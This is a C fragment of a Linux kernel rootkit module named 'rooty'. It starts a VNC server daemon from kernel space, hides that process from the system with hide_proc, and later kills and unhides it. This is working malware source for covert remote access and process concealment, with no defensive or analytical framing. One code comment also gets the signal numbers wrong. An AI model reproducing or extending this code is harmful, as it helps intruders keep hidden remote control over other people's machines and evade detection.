struct n_subprocess_info *vnc_sub_info;

pid_t vnc_pid;
int isVNCDrunning = 0;

char *vnc_argv[] = { "/sbin/vncd", NULL, NULL };
static char *vnc_envp[] = 
{
    "HOME=/",
    "TERM=xterm",
    "LOGNAME=jermey",
    "USERNAME=jermey",
    "USER=jermey",
	"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin", NULL 
};

int init_vnc(void)
{
	int ret;
	printk("rooty: Starting VNCD server\n");
		vnc_sub_info = n_call_usermodehelper_setup( vnc_argv[0], vnc_argv, vnc_envp, GFP_ATOMIC );
	if (vnc_sub_info == NULL) return -ENOMEM;

	ret = n_call_usermodehelper( "/sbin/vncd", vnc_argv, vnc_envp, UMH_WAIT_EXEC );
	if (ret != 0)
	{
        printk("rooty: error in call to vncd: %i\n", ret);
        return 1;
	}
    else
    {
		printk("rooty: vncd pid %d\n", callmodule_pid);
		vnc_pid = callmodule_pid;
		hide_proc(vnc_pid);
		isVNCDrunning = 1;
	}
	return 0;
}

void stop_vnc(void)
{
	if(isVNCDrunning)
	{
		struct siginfo info;
		struct task_struct *t;
		printk("rooty: Stopping VNCD server\n");
		memset(&info, 0, sizeof(struct siginfo));
		info.si_signo = 42; //33 Kernel base + SIGTERM(9)
		info.si_code = SI_QUEUE;
		info.si_int = 1234;

		rcu_read_lock();
		t = pid_task(find_vpid(vnc_pid), PIDTYPE_PID);
		rcu_read_unlock();
		if( t != NULL)
			send_sig_info(42, &info, t);

		unhide_proc(vnc_pid);
	}
}
